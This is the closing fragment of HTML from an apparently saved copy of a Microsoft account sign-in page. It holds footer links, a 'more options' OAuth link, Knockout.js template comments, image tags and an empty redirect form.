                        <!-- /ko --><a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick"
                            href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>                        <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick"
                            href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>
                        <!-- ko if: impressumLink -->
                        <!-- /ko -->
                        <!-- ko if: showIcpLicense -->
                        <!-- /ko -->
                        <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&amp;redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&amp;resource=00000002-0000-0ff1-ce00-000000000000&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid&amp;msafed=0&amp;client-request-id=10baa34e-b2c0-4736-8739-c2855c064bcc&amp;protectedtoken=true&amp;domain_hint=olivermcmillan.com&amp;nonce=636549723539902210.05010f04-acc6-48c5-be36-5727c7654faf&amp;state=FYtRDoMgEES1vQt_6Aoi9YP0Dr0BXZdospQG0fb4pR9vknmZaZumuVYulRZqNHbSkxlnq7TR8wxKDdCBgQECjNIjTnK8oZFP0pM0Vlm0dR58aOs39Onj-3smz9El3k7KEePG7F8dpijou59HZjcIZonoBtBaxLT8HYi3L6vro9-4X4ip0LIVirvwR1kftWTC4ko-6Ac#"
                            role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;], attr: { title: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;] }"
                            aria-label="Click here for more options" title="Click here for more options">
                            <!-- ko component: 'accessible-image-control' -->
                            <!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                            <!-- /ko -->
                            <!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme -->
                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation"
                                pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe"
                                svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"
                                data-bind="imgSrc" src="./Sign in to your account_files/ellipsis_white.svg">
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- ko component: 'accessible-image-control' -->
                            <!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                            <!-- /ko -->
                            <!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme -->
                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation"
                                pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004"
                                svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"
                                data-bind="imgSrc" src="./Sign in to your account_files/ellipsis_grey.svg">
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </a>
                    </div>
                    <!-- /ko -->
                </div>
            </div>
        </form>
        <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
            <!-- ko foreach: postRedirectParams -->
            <!-- /ko -->
        </form>
        <!-- ko if: svr.urlMsaMeControl -->
        <!-- /ko -->
        <!-- ko if: svr.urlCBPartnerPreload -->
        <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="./Sign in to your account_files/prefetch.html"
                style="display: none;"></iframe></div>
        <!-- /ko -->
    </div>
</body>

</html>